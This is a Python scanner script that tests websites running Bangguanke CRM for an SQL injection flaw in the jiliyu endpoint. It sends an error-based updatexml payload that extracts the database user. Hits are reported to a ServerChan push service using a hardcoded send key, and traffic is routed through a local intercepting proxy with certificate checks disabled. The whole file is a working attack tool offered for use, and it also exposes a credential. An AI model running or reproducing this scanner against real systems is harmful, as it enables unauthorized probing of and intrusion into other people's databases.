# bang_CRM_JILIYU_sql_scan.py
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_bang_CRM_JILIYU_sql(url, proxies, headers, append_to_output):
    if url.endswith("/"):
        path = "index.php/jiliyu"
    else:
        path = "/index.php/jiliyu"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    params = {
        'keyword': '1',
        'page': '1',
        'pai': 'id',
        'sou': 'soufast',
        'timedsc': '激励语列表',  # 将其保留为原始字符串
        'xu': "and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))"
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }

    encodetext = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(encodetext, params=params, headers=headers, verify=False, timeout=15, proxies=proxies)
        if req.status_code == 200 and 'localhost' in req.text:
            append_to_output(f"[+] {url} 存在帮管客 CRM jiliyu SQL注入漏洞！！！！", "red")
            ret = sc_send('帮管客 CRM jiliyu SQL注入漏洞', f"漏洞连接: {url}\r\n漏洞类型: SQL注入", key)
        else:
            append_to_output(f"[-] {url} 不存在帮管客 CRM jiliyu SQL注入漏洞", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
